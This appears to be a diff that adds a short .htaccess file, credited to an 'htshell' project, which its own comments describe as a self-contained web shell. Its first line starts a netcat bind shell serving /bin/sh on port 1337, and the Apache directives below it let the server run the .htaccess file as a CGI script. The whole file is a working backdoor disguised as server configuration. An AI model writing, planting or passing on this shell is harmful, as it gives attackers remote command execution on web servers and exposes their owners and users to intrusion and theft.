@@ -1,0 +1,11 @@
+#!/bin/nc -e /bin/sh -l -p 1337 &
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+Options +ExecCGI
+AddHandler cgi-script .htaccess
